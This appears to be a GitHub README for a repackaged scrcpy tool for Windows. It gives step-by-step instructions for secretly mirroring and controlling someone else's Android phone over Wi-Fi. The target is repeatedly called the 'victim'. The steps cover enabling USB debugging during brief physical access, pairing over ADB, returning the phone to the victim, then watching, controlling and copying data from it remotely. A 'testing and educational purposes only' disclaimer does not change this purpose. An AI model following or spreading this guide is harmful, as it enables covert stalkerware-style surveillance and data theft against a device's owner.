📄 Legal & Credits
🧑‍💻 Modified and packaged by: kool_efx

👨‍🔬 Based on Genymobile's SCRCPY

⚠️ For testing and educational purposes only. Unauthorized usage is discouraged.

# 🖥️ SCRCPY for Windows (Modified by kool_efx)

> 📲 **Mirror & Control Android Device via IP**  
> 🛠️ Based on [Genymobile's SCRCPY](https://github.com/Genymobile/scrcpy) — Modified into a portable, one-click solution.

---

## ⚙️ Requirements

- 🧠 **Basic Knowledge**: You must know the victim’s **local IP address** (e.g., `192.xxx.xxx.xx`).  
  ⏱️ Takes just **10 seconds** to find. (See `README.txt`)
- 📱 **Android Device Only**
- 🔌 **Initial USB Connection** is mandatory (only once).
- 🔧 **USB Debugging Enabled**:
  - Go to `Settings > About phone > Tap "Build number" 7 times`
  - Then go to `Developer options > Enable USB debugging`

---

## 🗂️ Setup Instructions

1. **Extract the ZIP** to any desired folder.
2. **Paste the `.bat` files** (`OneClickSCRCPY.bat`, `Watch.bat`, etc.) into the **same extracted folder**.
3. **Edit each `.bat` file** and replace the placeholder IP (`<IP>`) with the actual IP of the Android device.
   - 🔍 Find IP via: `Settings > Wi-Fi > Tap connected network > Scroll to IP address`

---

## 🚀 Usage

### 🔌 First-Time Setup
1. Connect phone via USB.
2. Run `scrcpy-connect.bat` (auto connects device via IP).
3. After success, disconnect the cable and return phone to the victim.

### 🖼️ Modes
- **Watch Only**: Run `Watch.bat` to view the Android screen.
- **Full Control**: Run `OneClickSCRCPY.bat` to view and control the screen.
- 📂 **Data Copy**: See `Data Copy.txt` for file/data extraction instructions.



## 🧪 Device Check / Troubleshooting

```bash
# List devices
adb devices

# Manually connect to a device via IP
.\scrcpy -s <IP>:5555

```

❌ If connection fails with a new device:
```bash
adb disconnect
adb kill-server
adb start-server
 ```
💡 If .bat files open in PowerShell by default, add .\ before the scrcpy command inside the batch file.

.

🔌 Shutdown Android Device via Command
```bash
adb -s <IP>:5555 shell input keyevent 26
```


TEST
![image](https://github.com/user-attachments/assets/98cfe5f5-b16c-442f-92e6-7d901a4a2cfe)
